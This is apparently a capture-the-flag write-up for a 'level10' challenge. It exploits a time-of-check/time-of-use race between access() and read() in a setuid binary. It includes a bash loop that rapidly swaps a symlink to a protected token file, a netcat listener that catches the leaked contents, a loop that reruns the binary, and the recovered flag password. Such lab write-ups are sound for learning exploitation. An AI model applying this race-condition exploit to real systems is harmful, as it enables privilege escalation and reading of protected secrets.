1. Decomplie the executable ./level10

2. The exploit lies in the test of the file using access before using read.
Hence the goal is to change the link of the file between the call of access and read.

3. Make use of symbolic link that switch at a high frequency to have a specific file tested by the "access" function and the file of interest read by the read function

4. ln script : 

#!/bin/bash
while true
do
    ln -sf /var/tmp/file /var/tmp/link
    ln -sf  ~/token /var/tmp/link
done

5. use of nc to retrieve the written file

nc 127.0.0.1 6969 -lk

-l for listen, so the netcat acts as a server
-k so the connection does not close after the first received packet

6. Launch the program in a loop to multiply the chances of having the right instruction happen in the right conditions

while :; do ./level10 /var/tmp/link 127.0.0.1 ; done

7. We get flag10 password : woupa2yuojeeaaed06riuj63c

8. we launch the  getflag command

